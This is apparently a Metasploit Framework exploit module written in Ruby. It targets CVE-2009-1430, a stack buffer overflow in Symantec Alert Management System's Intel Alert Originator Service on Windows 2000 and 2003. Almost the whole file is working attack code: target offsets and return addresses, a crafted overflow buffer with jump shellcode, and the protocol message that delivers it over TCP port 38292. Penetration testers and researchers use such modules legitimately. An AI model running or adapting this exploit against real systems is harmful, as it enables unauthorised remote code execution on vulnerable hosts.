##
# $Id: symantec_iao.rb 9298 2010-05-13 16:53:50Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec Alert Management System Intel Alert Originator Service Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Intel Alert Originator Service msgsys.exe.
				When an attacker sends a specially crafted alert, arbitrary code may be executed.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9298 $',
			'References'     =>
				[
					[ 'CVE', '2009-1430' ],
					[ 'OSVDB', '54159'],
					[ 'BID', '34674' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x20\x0a\x0d",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2003',     { 'Offset' => 1061, 'Ret' => 0x00401130 } ],
					[ 'Windows 2000 All', { 'Offset' => 1065, 'Ret' => 0x00401130 } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Apr 28 2009'))

		register_options( [ Opt::RPORT(38292) ], self.class )
	end

	def exploit

		connect

		filler = rand_text_alpha_upper(2048)

		sploit =  payload.encoded
		sploit << rand_text_alpha_upper(target['Offset'] - payload.encoded.length)
		sploit << Rex::Arch::X86.jmp_short(6) + rand_text_alpha_upper(2)
		sploit << [target.ret].pack('V')
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-950").encode_string
		sploit << rand_text_alpha_upper(rand(24) + 700) + "\x00"

		msg =  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x02\x00\x95\x94\xac\x10"
		msg << "\x08\xb4\x00\x00\x00\x00\x00\x00\x00\x00" + [filler.length].pack('V')
		msg << "ORIGCNFG" + "\x10\x00\x00\x00\x00\x00\x00\x00\x04\x00\x03\x03\xb8"
		msg << "\x60\x00\x00\x00\x00\x00\x00" + "BIND"
		msg << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
		msg << "\x04" + "BIND" + "\x00" + [filler.length].pack('V')
		msg << rand_text_alpha_upper(7) + " Alert" + sploit
		msg << "\x00" + [filler.length].pack('V') + [filler.length].pack('V')
		msg << rand_text_alpha_upper(rand(10) + 36)
		msg << filler + "\x00\x00\x00\x00" + "PRGX" + "\x00\x04\xAC\x10\x08\x1D"
		msg << "\x07\x08\x12\x00" + "ConfigurationName" + "\x00\x16\x00\x14\x00"
		msg << rand_text_alpha_upper(rand(1) + 25) + "\x00\x08\x08\x00" + "RunArgs"
		msg << "\x00\x04\x00\x02" + "\x00\x20\x00\x03\x05\x00" + "FormatString"
		msg << "\x00\x02\x00\x00\x00\x08\x12\x00" + "ConfigurationName"
		msg << "\x00\x02\x00\x00\x00\x08\x0C\x00" + "HandlerHost"
		msg << "\x00\x17\x00\x15\x00" + rhost + "\x00\x00\x00\x00\x00\x00"

		print_status("Trying target #{target.name}...")
		sock.put(msg)

		handler
		disconnect
	end

end
